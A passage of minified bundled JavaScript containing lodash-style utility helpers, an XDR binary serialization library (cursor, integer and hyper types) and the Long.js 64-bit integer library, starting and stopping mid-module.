    hasRequiredGet = 1;
    var _ = require_baseGet();
    function M(j, O, x) {
        var w = j == null ? void 0 : _(j, O);
        return w === void 0 ? x : w
    }
    return get_1 = M,
    get_1
}
var _baseHasIn, hasRequired_baseHasIn;
function require_baseHasIn() {
    if (hasRequired_baseHasIn)
        return _baseHasIn;
    hasRequired_baseHasIn = 1;
    function _(M, j) {
        return M != null && j in Object(M)
    }
    return _baseHasIn = _,
    _baseHasIn
}
var _hasPath, hasRequired_hasPath;
function require_hasPath() {
    if (hasRequired_hasPath)
        return _hasPath;
    hasRequired_hasPath = 1;
    var _ = require_castPath()
      , M = requireIsArguments$1()
      , j = requireIsArray()
      , O = require_isIndex()
      , x = requireIsLength()
      , w = require_toKey();
    function b(X, Y, F) {
        Y = _(Y, X);
        for (var V = -1, K = Y.length, Q = !1; ++V < K; ) {
            var ee = w(Y[V]);
            if (!(Q = X != null && F(X, ee)))
                break;
            X = X[ee]
        }
        return Q || ++V != K ? Q : (K = X == null ? 0 : X.length,
        !!K && x(K) && O(ee, K) && (j(X) || M(X)))
    }
    return _hasPath = b,
    _hasPath
}
var hasIn_1, hasRequiredHasIn;
function requireHasIn() {
    if (hasRequiredHasIn)
        return hasIn_1;
    hasRequiredHasIn = 1;
    var _ = require_baseHasIn()
      , M = require_hasPath();
    function j(O, x) {
        return O != null && M(O, x, _)
    }
    return hasIn_1 = j,
    hasIn_1
}
var _baseMatchesProperty, hasRequired_baseMatchesProperty;
function require_baseMatchesProperty() {
    if (hasRequired_baseMatchesProperty)
        return _baseMatchesProperty;
    hasRequired_baseMatchesProperty = 1;
    var _ = require_baseIsEqual()
      , M = requireGet()
      , j = requireHasIn()
      , O = require_isKey()
      , x = require_isStrictComparable()
      , w = require_matchesStrictComparable()
      , b = require_toKey()
      , X = 1
      , Y = 2;
    function F(V, K) {
        return O(V) && x(K) ? w(b(V), K) : function(Q) {
            var ee = M(Q, V);
            return ee === void 0 && ee === K ? j(Q, V) : _(K, ee, X | Y)
        }
    }
    return _baseMatchesProperty = F,
    _baseMatchesProperty
}
var _baseProperty, hasRequired_baseProperty;
function require_baseProperty() {
    if (hasRequired_baseProperty)
        return _baseProperty;
    hasRequired_baseProperty = 1;
    function _(M) {
        return function(j) {
            return j == null ? void 0 : j[M]
        }
    }
    return _baseProperty = _,
    _baseProperty
}
var _basePropertyDeep, hasRequired_basePropertyDeep;
function require_basePropertyDeep() {
    if (hasRequired_basePropertyDeep)
        return _basePropertyDeep;
    hasRequired_basePropertyDeep = 1;
    var _ = require_baseGet();
    function M(j) {
        return function(O) {
            return _(O, j)
        }
    }
    return _basePropertyDeep = M,
    _basePropertyDeep
}
var property_1, hasRequiredProperty;
function requireProperty() {
    if (hasRequiredProperty)
        return property_1;
    hasRequiredProperty = 1;
    var _ = require_baseProperty()
      , M = require_basePropertyDeep()
      , j = require_isKey()
      , O = require_toKey();
    function x(w) {
        return j(w) ? _(O(w)) : M(w)
    }
    return property_1 = x,
    property_1
}
var _baseIteratee, hasRequired_baseIteratee;
function require_baseIteratee() {
    if (hasRequired_baseIteratee)
        return _baseIteratee;
    hasRequired_baseIteratee = 1;
    var _ = require_baseMatches()
      , M = require_baseMatchesProperty()
      , j = requireIdentity()
      , O = requireIsArray()
      , x = requireProperty();
    function w(b) {
        return typeof b == "function" ? b : b == null ? j : typeof b == "object" ? O(b) ? M(b[0], b[1]) : _(b) : x(b)
    }
    return _baseIteratee = w,
    _baseIteratee
}
var every_1, hasRequiredEvery;
function requireEvery() {
    if (hasRequiredEvery)
        return every_1;
    hasRequiredEvery = 1;
    var _ = require_arrayEvery()
      , M = require_baseEvery()
      , j = require_baseIteratee()
      , O = requireIsArray()
      , x = require_isIterateeCall();
    function w(b, X, Y) {
        var F = O(b) ? _ : M;
        return Y && x(b, X, Y) && (X = void 0),
        F(b, j(X, 3))
    }
    return every_1 = w,
    every_1
}
var hasRequiredUtil$1;
function requireUtil$1() {
    if (hasRequiredUtil$1)
        return util$1;
    hasRequiredUtil$1 = 1,
    Object.defineProperty(util$1, "__esModule", {
        value: !0
    }),
    util$1.calculatePadding = O,
    util$1.slicePadding = x;
    var _ = requireEvery()
      , M = j(_);
    function j(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function O(w) {
        switch (w % 4) {
        case 0:
            return 0;
        case 1:
            return 3;
        case 2:
            return 2;
        case 3:
            return 1;
        default:
            return null
        }
    }
    function x(w, b) {
        var X = w.slice(b)
          , Y = (0,
        M.default)(X.buffer(), function(F) {
            return F === 0
        });
        if (Y !== !0)
            throw new Error("XDR Read Error: invalid padding")
    }
    return util$1
}
var hasRequiredCursor;
function requireCursor() {
    if (hasRequiredCursor)
        return cursor;
    hasRequiredCursor = 1,
    Object.defineProperty(cursor, "__esModule", {
        value: !0
    }),
    cursor.Cursor = void 0;
    var _ = function() {
        function x(w, b) {
            for (var X = 0; X < b.length; X++) {
                var Y = b[X];
                Y.enumerable = Y.enumerable || !1,
                Y.configurable = !0,
                "value"in Y && (Y.writable = !0),
                Object.defineProperty(w, Y.key, Y)
            }
        }
        return function(w, b, X) {
            return b && x(w.prototype, b),
            X && x(w, X),
            w
        }
    }()
      , M = requireUtil$1();
    function j(x, w) {
        if (!(x instanceof w))
            throw new TypeError("Cannot call a class as a function")
    }
    var O = function() {
        function x(w) {
            j(this, x),
            w instanceof Buffer || (w = typeof w == "number" ? Buffer.alloc(w) : Buffer.from(w)),
            this._setBuffer(w),
            this.rewind()
        }
        return _(x, [{
            key: "_setBuffer",
            value: function(b) {
                this._buffer = b,
                this.length = b.length
            }
        }, {
            key: "buffer",
            value: function() {
                return this._buffer
            }
        }, {
            key: "tap",
            value: function(b) {
                return b(this),
                this
            }
        }, {
            key: "clone",
            value: function(b) {
                var X = new this.constructor(this.buffer());
                return X.seek(arguments.length === 0 ? this.tell() : b),
                X
            }
        }, {
            key: "tell",
            value: function() {
                return this._index
            }
        }, {
            key: "seek",
            value: function(b, X) {
                return arguments.length === 1 && (X = b,
                b = "="),
                b === "+" ? this._index += X : b === "-" ? this._index -= X : this._index = X,
                this
            }
        }, {
            key: "rewind",
            value: function() {
                return this.seek(0)
            }
        }, {
            key: "eof",
            value: function() {
                return this.tell() === this.buffer().length
            }
        }, {
            key: "write",
            value: function(b, X, Y) {
                return this.seek("+", this.buffer().write(b, this.tell(), X, Y))
            }
        }, {
            key: "fill",
            value: function(b, X) {
                return arguments.length === 1 && (X = this.buffer().length - this.tell()),
                this.buffer().fill(b, this.tell(), this.tell() + X),
                this.seek("+", X),
                this
            }
        }, {
            key: "slice",
            value: function(b) {
                arguments.length === 0 && (b = this.length - this.tell());
                var X = new this.constructor(this.buffer().slice(this.tell(), this.tell() + b));
                return this.seek("+", b),
                X
            }
        }, {
            key: "copyFrom",
            value: function(b) {
                var X = b instanceof Buffer ? b : b.buffer();
                return X.copy(this.buffer(), this.tell(), 0, X.length),
                this.seek("+", X.length),
                this
            }
        }, {
            key: "concat",
            value: function(b) {
                b.forEach(function(Y, F) {
                    Y instanceof x && (b[F] = Y.buffer())
                }),
                b.unshift(this.buffer());
                var X = Buffer.concat(b);
                return this._setBuffer(X),
                this
            }
        }, {
            key: "toString",
            value: function(b, X) {
                arguments.length === 0 ? (b = "utf8",
                X = this.buffer().length - this.tell()) : arguments.length === 1 && (X = this.buffer().length - this.tell());
                var Y = this.buffer().toString(b, this.tell(), this.tell() + X);
                return this.seek("+", X),
                Y
            }
        }, {
            key: "writeBufferPadded",
            value: function(b) {
                var X = (0,
                M.calculatePadding)(b.length)
                  , Y = Buffer.alloc(X);
                return this.copyFrom(new x(b)).copyFrom(new x(Y))
            }
        }]),
        x
    }();
    return [[1, ["readInt8", "readUInt8"]], [2, ["readInt16BE", "readInt16LE", "readUInt16BE", "readUInt16LE"]], [4, ["readInt32BE", "readInt32LE", "readUInt32BE", "readUInt32LE", "readFloatBE", "readFloatLE"]], [8, ["readDoubleBE", "readDoubleLE"]]].forEach(function(x) {
        x[1].forEach(function(w) {
            O.prototype[w] = function() {
                var X = this.buffer()[w](this.tell());
                return this.seek("+", x[0]),
                X
            }
        })
    }),
    [[1, ["writeInt8", "writeUInt8"]], [2, ["writeInt16BE", "writeInt16LE", "writeUInt16BE", "writeUInt16LE"]], [4, ["writeInt32BE", "writeInt32LE", "writeUInt32BE", "writeUInt32LE", "writeFloatBE", "writeFloatLE"]], [8, ["writeDoubleBE", "writeDoubleLE"]]].forEach(function(x) {
        x[1].forEach(function(w) {
            O.prototype[w] = function(X) {
                return this.buffer()[w](X, this.tell()),
                this.seek("+", x[0]),
                this
            }
        })
    }),
    cursor.Cursor = O,
    cursor
}
var hasRequiredIoMixin;
function requireIoMixin() {
    if (hasRequiredIoMixin)
        return ioMixin;
    hasRequiredIoMixin = 1,
    Object.defineProperty(ioMixin, "__esModule", {
        value: !0
    }),
    ioMixin.default = F;
    var _ = requireExtend()
      , M = w(_)
      , j = requireIsFunction()
      , O = w(j)
      , x = requireCursor();
    function w(V) {
        return V && V.__esModule ? V : {
            default: V
        }
    }
    var b = Math.pow(2, 16)
      , X = {
        toXDR: function(K) {
            var Q = new x.Cursor(b);
            this.write(K, Q);
            var ee = Q.tell();
            return Q.rewind(),
            Q.slice(ee).buffer()
        },
        fromXDR: function(K) {
            var Q = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "raw"
              , ee = void 0;
            switch (Q) {
            case "raw":
                ee = K;
                break;
            case "hex":
                ee = Buffer.from(K, "hex");
                break;
            case "base64":
                ee = Buffer.from(K, "base64");
                break;
            default:
                throw new Error("Invalid format " + Q + ', must be "raw", "hex", "base64"')
            }
            var ae = new x.Cursor(ee)
              , ne = this.read(ae);
            return ne
        },
        validateXDR: function(K) {
            var Q = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "raw";
            try {
                return this.fromXDR(K, Q),
                !0
            } catch {
                return !1
            }
        }
    }
      , Y = {
        toXDR: function() {
            var K = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "raw"
              , Q = this.constructor.toXDR(this);
            switch (K) {
            case "raw":
                return Q;
            case "hex":
                return Q.toString("hex");
            case "base64":
                return Q.toString("base64");
            default:
                throw new Error("Invalid format " + K + ', must be "raw", "hex", "base64"')
            }
        }
    };
    function F(V) {
        (0,
        M.default)(V, X),
        (0,
        O.default)(V) && (0,
        M.default)(V.prototype, Y)
    }
    return ioMixin
}
var hasRequiredInt;
function requireInt() {
    if (hasRequiredInt)
        return int;
    hasRequiredInt = 1,
    Object.defineProperty(int, "__esModule", {
        value: !0
    }),
    int.Int = void 0;
    var _ = requireIsNumber()
      , M = x(_)
      , j = requireIoMixin()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    var w = int.Int = {
        read: function(X) {
            return X.readInt32BE()
        },
        write: function(X, Y) {
            if (!(0,
            M.default)(X))
                throw new Error("XDR Write Error: not a number");
            if (Math.floor(X) !== X)
                throw new Error("XDR Write Error: not an integer");
            Y.writeInt32BE(X)
        },
        isValid: function(X) {
            return !(0,
            M.default)(X) || Math.floor(X) !== X ? !1 : X >= w.MIN_VALUE && X <= w.MAX_VALUE
        }
    };
    return w.MAX_VALUE = Math.pow(2, 31) - 1,
    w.MIN_VALUE = -Math.pow(2, 31),
    (0,
    O.default)(w),
    int
}
var hyper = {}
  , Long$1 = {
    exports: {}
};
/**
 * @license Long.js (c) 2013 Daniel Wirtz <dcode@dcode.io>
 * Released under the Apache License, Version 2.0
 * see: https://github.com/dcodeIO/Long.js for details
 */
var Long = Long$1.exports, hasRequiredLong;
function requireLong() {
    return hasRequiredLong || (hasRequiredLong = 1,
    function(_) {
        (function(M, j) {
            typeof commonjsRequire == "function" && _ && _.exports ? _.exports = j() : (M.dcodeIO = M.dcodeIO || {}).Long = j()
        }
        )(Long, function() {
            function M(V, K, Q) {
                this.low = V | 0,
                this.high = K | 0,
                this.unsigned = !!Q
            }
            M.__isLong__,
            Object.defineProperty(M.prototype, "__isLong__", {
                value: !0,
                enumerable: !1,
                configurable: !1
            }),
            M.isLong = function(K) {
                return (K && K.__isLong__) === !0
            }
            ;
            var j = {}
              , O = {};
            M.fromInt = function(K, Q) {
                var ee, ae;
                return Q ? (K = K >>> 0,
                0 <= K && K < 256 && (ae = O[K],
                ae) ? ae : (ee = new M(K,(K | 0) < 0 ? -1 : 0,!0),
                0 <= K && K < 256 && (O[K] = ee),
                ee)) : (K = K | 0,
                -128 <= K && K < 128 && (ae = j[K],
                ae) ? ae : (ee = new M(K,K < 0 ? -1 : 0,!1),
                -128 <= K && K < 128 && (j[K] = ee),
                ee))
            }
            ,
            M.fromNumber = function(K, Q) {
                return Q = !!Q,
                isNaN(K) || !isFinite(K) ? M.ZERO : !Q && K <= -Y ? M.MIN_VALUE : !Q && K + 1 >= Y ? M.MAX_VALUE : Q && K >= X ? M.MAX_UNSIGNED_VALUE : K < 0 ? M.fromNumber(-K, Q).negate() : new M(K % b | 0,K / b | 0,Q)
            }
            ,
            M.fromBits = function(K, Q, ee) {
                return new M(K,Q,ee)
            }
            ,
            M.fromString = function(K, Q, ee) {
                if (K.length === 0)
                    throw Error("number format error: empty string");
                if (K === "NaN" || K === "Infinity" || K === "+Infinity" || K === "-Infinity")
                    return M.ZERO;
                if (typeof Q == "number" && (ee = Q,
                Q = !1),
                ee = ee || 10,
                ee < 2 || 36 < ee)
                    throw Error("radix out of range: " + ee);
                var ae;
                if ((ae = K.indexOf("-")) > 0)
                    throw Error('number format error: interior "-" character: ' + K);
                if (ae === 0)
                    return M.fromString(K.substring(1), Q, ee).negate();
                for (var ne = M.fromNumber(Math.pow(ee, 8)), oe = M.ZERO, ue = 0; ue < K.length; ue += 8) {
                    var fe = Math.min(8, K.length - ue)
                      , he = parseInt(K.substring(ue, ue + fe), ee);
                    if (fe < 8) {
                        var pe = M.fromNumber(Math.pow(ee, fe));
                        oe = oe.multiply(pe).add(M.fromNumber(he))
                    } else
                        oe = oe.multiply(ne),
                        oe = oe.add(M.fromNumber(he))
                }
                return oe.unsigned = Q,
                oe
            }
            ,
            M.fromValue = function(K) {
                return K instanceof M ? K : typeof K == "number" ? M.fromNumber(K) : typeof K == "string" ? M.fromString(K) : new M(K.low,K.high,K.unsigned)
            }
            ;
            var x = 65536
              , w = 1 << 24
              , b = x * x
              , X = b * b
              , Y = X / 2
              , F = M.fromInt(w);
            return M.ZERO = M.fromInt(0),
            M.UZERO = M.fromInt(0, !0),
            M.ONE = M.fromInt(1),
            M.UONE = M.fromInt(1, !0),
            M.NEG_ONE = M.fromInt(-1),
            M.MAX_VALUE = M.fromBits(-1, 2147483647, !1),
            M.MAX_UNSIGNED_VALUE = M.fromBits(-1, -1, !0),
            M.MIN_VALUE = M.fromBits(0, -2147483648, !1),
            M.prototype.toInt = function() {
                return this.unsigned ? this.low >>> 0 : this.low
            }
            ,
            M.prototype.toNumber = function() {
                return this.unsigned ? (this.high >>> 0) * b + (this.low >>> 0) : this.high * b + (this.low >>> 0)
            }
            ,
            M.prototype.toString = function(K) {
                if (K = K || 10,
                K < 2 || 36 < K)
                    throw RangeError("radix out of range: " + K);
                if (this.isZero())
                    return "0";
                var Q;
                if (this.isNegative())
                    if (this.equals(M.MIN_VALUE)) {
                        var ee = M.fromNumber(K)
                          , ae = this.divide(ee);
                        return Q = ae.multiply(ee).subtract(this),
                        ae.toString(K) + Q.toInt().toString(K)
                    } else
                        return "-" + this.negate().toString(K);
                var ne = M.fromNumber(Math.pow(K, 6), this.unsigned);
                Q = this;
                for (var oe = ""; ; ) {
                    var ue = Q.divide(ne)
                      , fe = Q.subtract(ue.multiply(ne)).toInt() >>> 0
                      , he = fe.toString(K);
                    if (Q = ue,
                    Q.isZero())
                        return he + oe;
                    for (; he.length < 6; )
                        he = "0" + he;
                    oe = "" + he + oe
                }
            }
            ,
            M.prototype.getHighBits = function() {
                return this.high
            }
            ,
            M.prototype.getHighBitsUnsigned = function() {
                return this.high >>> 0
            }
            ,
            M.prototype.getLowBits = function() {
                return this.low
            }
            ,
            M.prototype.getLowBitsUnsigned = function() {
                return this.low >>> 0
            }
            ,
            M.prototype.getNumBitsAbs = function() {
                if (this.isNegative())
                    return this.equals(M.MIN_VALUE) ? 64 : this.negate().getNumBitsAbs();
                for (var K = this.high != 0 ? this.high : this.low, Q = 31; Q > 0 && (K & 1 << Q) == 0; Q--)
                    ;
                return this.high != 0 ? Q + 33 : Q + 1
            }
            ,
            M.prototype.isZero = function() {
                return this.high === 0 && this.low === 0
            }
            ,
            M.prototype.isNegative = function() {
                return !this.unsigned && this.high < 0
            }
            ,
            M.prototype.isPositive = function() {
                return this.unsigned || this.high >= 0
            }
            ,
            M.prototype.isOdd = function() {
                return (this.low & 1) === 1
            }
            ,
            M.prototype.isEven = function() {
                return (this.low & 1) === 0
            }
            ,
            M.prototype.equals = function(K) {
                return M.isLong(K) || (K = M.fromValue(K)),
                this.unsigned !== K.unsigned && this.high >>> 31 === 1 && K.high >>> 31 === 1 ? !1 : this.high === K.high && this.low === K.low
            }
            ,
            M.eq = M.prototype.equals,
            M.prototype.notEquals = function(K) {
                return !this.equals(K)
            }
            ,
            M.neq = M.prototype.notEquals,
            M.prototype.lessThan = function(K) {
                return this.compare(K) < 0
            }
            ,
            M.prototype.lt = M.prototype.lessThan,
            M.prototype.lessThanOrEqual = function(K) {
                return this.compare(K) <= 0
            }
            ,
            M.prototype.lte = M.prototype.lessThanOrEqual,
            M.prototype.greaterThan = function(K) {
                return this.compare(K) > 0
            }
            ,
            M.prototype.gt = M.prototype.greaterThan,
            M.prototype.greaterThanOrEqual = function(K) {
                return this.compare(K) >= 0
            }
            ,
            M.prototype.gte = M.prototype.greaterThanOrEqual,
            M.prototype.compare = function(K) {
                if (M.isLong(K) || (K = M.fromValue(K)),
                this.equals(K))
                    return 0;
                var Q = this.isNegative()
                  , ee = K.isNegative();
                return Q && !ee ? -1 : !Q && ee ? 1 : this.unsigned ? K.high >>> 0 > this.high >>> 0 || K.high === this.high && K.low >>> 0 > this.low >>> 0 ? -1 : 1 : this.subtract(K).isNegative() ? -1 : 1
            }
            ,
            M.prototype.negate = function() {
                return !this.unsigned && this.equals(M.MIN_VALUE) ? M.MIN_VALUE : this.not().add(M.ONE)
            }
            ,
            M.prototype.neg = M.prototype.negate,
            M.prototype.add = function(K) {
                M.isLong(K) || (K = M.fromValue(K));
                var Q = this.high >>> 16
                  , ee = this.high & 65535
                  , ae = this.low >>> 16
                  , ne = this.low & 65535
                  , oe = K.high >>> 16
                  , ue = K.high & 65535
                  , fe = K.low >>> 16
                  , he = K.low & 65535
                  , pe = 0
                  , ye = 0
                  , be = 0
                  , xe = 0;
                return xe += ne + he,
                be += xe >>> 16,
                xe &= 65535,
                be += ae + fe,
                ye += be >>> 16,
                be &= 65535,
                ye += ee + ue,
                pe += ye >>> 16,
                ye &= 65535,
                pe += Q + oe,
                pe &= 65535,
                M.fromBits(be << 16 | xe, pe << 16 | ye, this.unsigned)
            }
            ,
            M.prototype.subtract = function(K) {
                return M.isLong(K) || (K = M.fromValue(K)),
                this.add(K.negate())
            }
            ,
            M.prototype.sub = M.prototype.subtract,
            M.prototype.multiply = function(K) {
                if (this.isZero() || (M.isLong(K) || (K = M.fromValue(K)),
                K.isZero()))
                    return M.ZERO;
                if (this.equals(M.MIN_VALUE))
                    return K.isOdd() ? M.MIN_VALUE : M.ZERO;
                if (K.equals(M.MIN_VALUE))
                    return this.isOdd() ? M.MIN_VALUE : M.ZERO;
                if (this.isNegative())
                    return K.isNegative() ? this.negate().multiply(K.negate()) : this.negate().multiply(K).negate();
                if (K.isNegative())
                    return this.multiply(K.negate()).negate();
                if (this.lessThan(F) && K.lessThan(F))
                    return M.fromNumber(this.toNumber() * K.toNumber(), this.unsigned);
                var Q = this.high >>> 16
                  , ee = this.high & 65535
                  , ae = this.low >>> 16
                  , ne = this.low & 65535
                  , oe = K.high >>> 16
                  , ue = K.high & 65535
                  , fe = K.low >>> 16
                  , he = K.low & 65535
                  , pe = 0
                  , ye = 0
                  , be = 0
                  , xe = 0;
                return xe += ne * he,
                be += xe >>> 16,
                xe &= 65535,
                be += ae * he,
                ye += be >>> 16,
                be &= 65535,
                be += ne * fe,
                ye += be >>> 16,
                be &= 65535,
                ye += ee * he,
                pe += ye >>> 16,
                ye &= 65535,
                ye += ae * fe,
                pe += ye >>> 16,
                ye &= 65535,
                ye += ne * ue,
                pe += ye >>> 16,
                ye &= 65535,
                pe += Q * he + ee * fe + ae * ue + ne * oe,
                pe &= 65535,
                M.fromBits(be << 16 | xe, pe << 16 | ye, this.unsigned)
            }
            ,
            M.prototype.mul = M.prototype.multiply,
            M.prototype.divide = function(K) {
                if (M.isLong(K) || (K = M.fromValue(K)),
                K.isZero())
                    throw new Error("division by zero");
                if (this.isZero())
                    return this.unsigned ? M.UZERO : M.ZERO;
                var Q, ee, ae;
                if (this.equals(M.MIN_VALUE)) {
                    if (K.equals(M.ONE) || K.equals(M.NEG_ONE))
                        return M.MIN_VALUE;
                    if (K.equals(M.MIN_VALUE))
                        return M.ONE;
                    var ne = this.shiftRight(1);
                    return Q = ne.divide(K).shiftLeft(1),
                    Q.equals(M.ZERO) ? K.isNegative() ? M.ONE : M.NEG_ONE : (ee = this.subtract(K.multiply(Q)),
                    ae = Q.add(ee.divide(K)),
                    ae)
                } else if (K.equals(M.MIN_VALUE))
                    return this.unsigned ? M.UZERO : M.ZERO;
                if (this.isNegative())
                    return K.isNegative() ? this.negate().divide(K.negate()) : this.negate().divide(K).negate();
                if (K.isNegative())
                    return this.divide(K.negate()).negate();
                for (ae = M.ZERO,
                ee = this; ee.greaterThanOrEqual(K); ) {
                    Q = Math.max(1, Math.floor(ee.toNumber() / K.toNumber()));
                    for (var oe = Math.ceil(Math.log(Q) / Math.LN2), ue = oe <= 48 ? 1 : Math.pow(2, oe - 48), fe = M.fromNumber(Q), he = fe.multiply(K); he.isNegative() || he.greaterThan(ee); )
                        Q -= ue,
                        fe = M.fromNumber(Q, this.unsigned),
                        he = fe.multiply(K);
                    fe.isZero() && (fe = M.ONE),
                    ae = ae.add(fe),
                    ee = ee.subtract(he)
                }
                return ae
            }
            ,
            M.prototype.div = M.prototype.divide,
            M.prototype.modulo = function(K) {
                return M.isLong(K) || (K = M.fromValue(K)),
                this.subtract(this.divide(K).multiply(K))
            }
            ,
            M.prototype.mod = M.prototype.modulo,
            M.prototype.not = function() {
                return M.fromBits(~this.low, ~this.high, this.unsigned)
            }
            ,
            M.prototype.and = function(K) {
                return M.isLong(K) || (K = M.fromValue(K)),
                M.fromBits(this.low & K.low, this.high & K.high, this.unsigned)
            }
            ,
            M.prototype.or = function(K) {
                return M.isLong(K) || (K = M.fromValue(K)),
                M.fromBits(this.low | K.low, this.high | K.high, this.unsigned)
            }
            ,
            M.prototype.xor = function(K) {
                return M.isLong(K) || (K = M.fromValue(K)),
                M.fromBits(this.low ^ K.low, this.high ^ K.high, this.unsigned)
            }
            ,
            M.prototype.shiftLeft = function(K) {
                return M.isLong(K) && (K = K.toInt()),
                (K &= 63) === 0 ? this : K < 32 ? M.fromBits(this.low << K, this.high << K | this.low >>> 32 - K, this.unsigned) : M.fromBits(0, this.low << K - 32, this.unsigned)
            }
            ,
            M.prototype.shl = M.prototype.shiftLeft,
            M.prototype.shiftRight = function(K) {
                return M.isLong(K) && (K = K.toInt()),
                (K &= 63) === 0 ? this : K < 32 ? M.fromBits(this.low >>> K | this.high << 32 - K, this.high >> K, this.unsigned) : M.fromBits(this.high >> K - 32, this.high >= 0 ? 0 : -1, this.unsigned)
            }
            ,
            M.prototype.shr = M.prototype.shiftRight,
            M.prototype.shiftRightUnsigned = function(K) {
                if (M.isLong(K) && (K = K.toInt()),
                K &= 63,
                K === 0)
                    return this;
                var Q = this.high;
                if (K < 32) {
                    var ee = this.low;
                    return M.fromBits(ee >>> K | Q << 32 - K, Q >>> K, this.unsigned)
                } else
                    return K === 32 ? M.fromBits(Q, 0, this.unsigned) : M.fromBits(Q >>> K - 32, 0, this.unsigned)
            }
            ,
            M.prototype.shru = M.prototype.shiftRightUnsigned,
            M.prototype.toSigned = function() {
                return this.unsigned ? new M(this.low,this.high,!1) : this
            }
            ,
            M.prototype.toUnsigned = function() {
                return this.unsigned ? this : new M(this.low,this.high,!0)
            }
            ,
            M
        })
    }(Long$1)),
    Long$1.exports
}
var hasRequiredHyper;
function requireHyper() {
    if (hasRequiredHyper)
        return hyper;
    hasRequiredHyper = 1,
    Object.defineProperty(hyper, "__esModule", {
        value: !0
    }),
    hyper.Hyper = void 0;
    var _ = function() {
        function K(Q, ee) {
            for (var ae = 0; ae < ee.length; ae++) {
                var ne = ee[ae];
                ne.enumerable = ne.enumerable || !1,
                ne.configurable = !0,
                "value"in ne && (ne.writable = !0),
                Object.defineProperty(Q, ne.key, ne)
            }
        }
        return function(Q, ee, ae) {
            return ee && K(Q.prototype, ee),
            ae && K(Q, ae),
            Q
        }
    }()
      , M = function K(Q, ee, ae) {
        Q === null && (Q = Function.prototype);
        var ne = Object.getOwnPropertyDescriptor(Q, ee);
        if (ne === void 0) {
            var oe = Object.getPrototypeOf(Q);
            return oe === null ? void 0 : K(oe, ee, ae)
        } else {
            if ("value"in ne)
                return ne.value;
            var ue = ne.get;
            return ue === void 0 ? void 0 : ue.call(ae)
        }
    }
      , j = requireLong()
      , O = b(j)
      , x = requireIoMixin()
      , w = b(x);
    function b(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function X(K, Q) {
        if (!(K instanceof Q))
            throw new TypeError("Cannot call a class as a function")
    }
    function Y(K, Q) {
        if (!K)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return Q && (typeof Q == "object" || typeof Q == "function") ? Q : K
    }
    function F(K, Q) {
        if (typeof Q != "function" && Q !== null)
            throw new TypeError("Super expression must either be null or a function, not " + typeof Q);
        K.prototype = Object.create(Q && Q.prototype, {
            constructor: {
                value: K,
                enumerable: !1,
                writable: !0,
                configurable: !0
            }
        }),
        Q && (Object.setPrototypeOf ? Object.setPrototypeOf(K, Q) : K.__proto__ = Q)
    }
    var V = hyper.Hyper = function(K) {
        F(Q, K),
        _(Q, null, [{
            key: "read",
            value: function(ae) {
                var ne = ae.readInt32BE()
                  , oe = ae.readInt32BE();
                return this.fromBits(oe, ne)
            }
        }, {
            key: "write",
            value: function(ae, ne) {
                if (!(ae instanceof this))
                    throw new Error("XDR Write Error: " + ae + " is not a Hyper");
                ne.writeInt32BE(ae.high),
                ne.writeInt32BE(ae.low)
            }
        }, {
            key: "fromString",
            value: function(ae) {
                if (!/^-?\d+$/.test(ae))
                    throw new Error("Invalid hyper string: " + ae);
                var ne = M(Q.__proto__ || Object.getPrototypeOf(Q), "fromString", this).call(this, ae, !1);
                return new this(ne.low,ne.high)
            }
        }, {
            key: "fromBits",
            value: function(ae, ne) {
                var oe = M(Q.__proto__ || Object.getPrototypeOf(Q), "fromBits", this).call(this, ae, ne, !1);
                return new this(oe.low,oe.high)
            }
        }, {
            key: "isValid",
            value: function(ae) {
                return ae instanceof this
            }
        }]);
        function Q(ee, ae) {
            return X(this, Q),
            Y(this, (Q.__proto__ || Object.getPrototypeOf(Q)).call(this, ee, ae, !1))
        }
        return Q
    }(O.default);
    return (0,
    w.default)(V),
    V.MAX_VALUE = new V(O.default.MAX_VALUE.low,O.default.MAX_VALUE.high),
    V.MIN_VALUE = new V(O.default.MIN_VALUE.low,O.default.MIN_VALUE.high),
    hyper
}
var unsignedInt = {}, hasRequiredUnsignedInt;
function requireUnsignedInt() {
    if (hasRequiredUnsignedInt)
        return unsignedInt;
    hasRequiredUnsignedInt = 1,
    Object.defineProperty(unsignedInt, "__esModule", {
        value: !0
    }),
    unsignedInt.UnsignedInt = void 0;
    var _ = requireIsNumber()
      , M = x(_)
      , j = requireIoMixin()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    var w = unsignedInt.UnsignedInt = {
        read: function(X) {
            return X.readUInt32BE()
        },
        write: function(X, Y) {
            if (!(0,
            M.default)(X))
                throw new Error("XDR Write Error: not a number");
            if (Math.floor(X) !== X)
                throw new Error("XDR Write Error: not an integer");
            if (X < 0)
                throw new Error("XDR Write Error: negative number " + X);
            Y.writeUInt32BE(X)
        },
        isValid: function(X) {
            return !(0,
            M.default)(X) || Math.floor(X) !== X ? !1 : X >= w.MIN_VALUE && X <= w.MAX_VALUE
        }
    };
    return w.MAX_VALUE = Math.pow(2, 32) - 1,
    w.MIN_VALUE = 0,
    (0,
    O.default)(w),
    unsignedInt
}
var unsignedHyper = {}, hasRequiredUnsignedHyper;
function requireUnsignedHyper() {
    if (hasRequiredUnsignedHyper)
        return unsignedHyper;
    hasRequiredUnsignedHyper = 1,
    Object.defineProperty(unsignedHyper, "__esModule", {
        value: !0
    }),
    unsignedHyper.UnsignedHyper = void 0;
    var _ = function() {
        function K(Q, ee) {
            for (var ae = 0; ae < ee.length; ae++) {
                var ne = ee[ae];
                ne.enumerable = ne.enumerable || !1,
                ne.configurable = !0,
                "value"in ne && (ne.writable = !0),
                Object.defineProperty(Q, ne.key, ne)
            }
        }
        return function(Q, ee, ae) {
            return ee && K(Q.prototype, ee),
            ae && K(Q, ae),
            Q
        }
    }()
      , M = function K(Q, ee, ae) {
        Q === null && (Q = Function.prototype);
        var ne = Object.getOwnPropertyDescriptor(Q, ee);
        if (ne === void 0) {
            var oe = Object.getPrototypeOf(Q);
            return oe === null ? void 0 : K(oe, ee, ae)
        } else {
            if ("value"in ne)
                return ne.value;
            var ue = ne.get;
            return ue === void 0 ? void 0 : ue.call(ae)
        }
    }
      , j = requireLong()
      , O = b(j)
      , x = requireIoMixin()
      , w = b(x);
